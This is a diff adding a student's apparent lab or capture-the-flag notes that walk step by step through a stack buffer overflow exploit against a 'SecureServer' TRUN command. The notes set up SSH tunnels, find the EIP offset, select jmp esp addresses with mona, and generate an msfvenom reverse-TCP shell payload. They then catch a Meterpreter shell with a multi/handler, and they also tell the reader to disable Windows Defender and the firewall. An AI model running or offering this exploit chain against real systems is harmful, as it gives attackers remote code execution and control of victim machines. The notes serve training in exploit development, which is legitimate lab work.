@@ -1,0 +1,139 @@
+Demo /////////////////////////////////////////////////////
+switch between Windows and Linuz Op station 
+#1 Go to a website on Windows off station and then use string finder and find out what time of OS the file (func) is meant for. 
+#2 Then open it in Ghidra to see the functions, function found is gets which is vulnerable to buffer overflow attacks. We also see that it has a max size of 50 bytes.
+#3
+
+
+
+1st Terminal
+2nd Terminal
+3rd Terminal
+4th Terminal
+////////////////////////////////////////////////////////////////////////////////////////////////
+CTFs
+
+Scheme of Maneuver:
+>Jump Box
+->T1: 192.168.28.111
+->T2: 192.168.28.105
+
+>Jump Box
+->donovian_grey_host
+-->T3: 192.168.150.245
+
+Linux--------------------------------------
+1st Terminal
+  ssh -MS /tmp/jump student@10.50.29.89  (connection to jump box)
+  2nd Terminal
+  ssh -S /tmp/jump jim
+  3rd Terminal
+  ssh -S /tmp/jump jim -O forward -D9050
+  4th Terminal 
+  ssh -S /tmp/jump jim -O forward -L 2131:192.168.28.111:2222 
+  ssh -S /tmp/jump jim -O forward -L 2130:192.168.28.105:2222
+  
+  Through Windows OP station open CTF website and download file to computer and run:
+   scp inventory.exe student@192.168.65.20:
+   
+  Terminals
+  ./inventory.exe
+  gdb inventory.exe
+  info functions
+  pdisass main
+  pdisass getTheGoods
+  run                    --(make sure to exceed character limit)--
+Windows--------------------------
+  In windows op station powershell
+  .\SysinternalsSuite\strings.exe .\essfunc.dll     --(Look for strings indicatinf system)
+  .\SysinternalsSuite\strings.exe .\secureserverind.exe
+  get-content .\secureserverind.exe | select -first 1
+  ./secureserverind.exe
+  Open Windows Defender Firewall
+    Make sure the firewalls are turned off
+  Go to Windows Security
+    Then Virus and threat protection settings, turn off all protection options
+  Close both the windows
+  PS- Open a powershell admin
+  netstat -anob
+  
+  Go to Linux op station
+  nc 10.50.27.61 9999 (It should say "Welcome to SecureServer! Enter HELP for help.")
+  HELP (For commands)
+  TRUN sdfioygsdofyigdsfoysdgdyfgsdousdfy
+  
+  Go to Ghidra
+  drag secureserverind.exe into Ghidra
+  Search for TRUN string
+  double click the function
+  Find the TRUN value which is on line 81
+  follow code going up to figure out its functions
+  
+  Open immunity debugger
+  then attach secureserverind
+  *Make sure that the immunity debugger is not paused*
+  
+  Then to lin ops
+  vi demo_stuff.py 
+    	#!/usr/bin/env python
+	import socket
+
+	buf = "TRUN /.:/"
+	buf += "A" * 70
+
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(("10.50.27.61", 9999))
+	print s.recv(1024)
+	s.send(buf)
+	print s.recv(1024)
+
+	s.close()
+  Then save the file
+
+  chmod u+x demo_stuff.py
+  ./demo_stuff.py
+  
+  Go to https://wiremask.eu
+  put in 2100 in the tools, buffer overflow
+  copy the output and put it into the python script like (buf += "<Output>")
+  Comment # out the A *70 line
+  Copy register value next to EIP on immunity debugger, then put it into register value box on wiremask website
+  Rewind immunity dubugger and play it again
+  then remove line with long string
+  then uncomment other line and add line buf += "BBBB"
+  also change value on A variable from 70 to 2003
+  
+  In immunity debugger go to white line below windows and type !mona modules
+  !mona jmp -r esp -m "essfunc.dll"
+  Window tab, log data
+  copy address on 6250, first 4 lines, transfer the lines to demo_stuff.py as such:
+    4 #625011AF -> 0x62 50 11 AF -> "\xaf\x11\x50\x62"
+    5 #625011BB -> 0x62 50 11 BB -> "\xbb\x11\x50\x62"
+    6 #625011C7 -> 0x62 50 11 C7 -> "\xc7\x11\x50\x62"
+    7 #625011D3 -> 0x62 50 11 D3 -> "\xd3\x11\x50\x62"
+  Then add the line replacing BBBB with ->   \xaf\x11\x50\x62 (This is the first backwards code)
+  
+  On a new terminal window for msfvenom
+    msfvenom -p windows/shell/reverse_tcp lhost=10.50.26.72 lport=42527 -b "\x00" -f python
+    copy the whole aouput besides first line
+    
+  open msfconsole
+    use multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    show options
+    set LHOST 0.0.0.0
+    set LPORT 42527
+    exploit
+    
+  Rewind immunity debugger and press play
+  ./demo_stuff.py
+  
+  Troubleshooting------
+  
+  add buf += "\x90" * 15 to script
+  
+  Rewind immunity debugger and play again
+  
+  ./demo_stuff.py
+  you should get a meterpreter shell in the msf6 exploit window
+  Do situational awareness
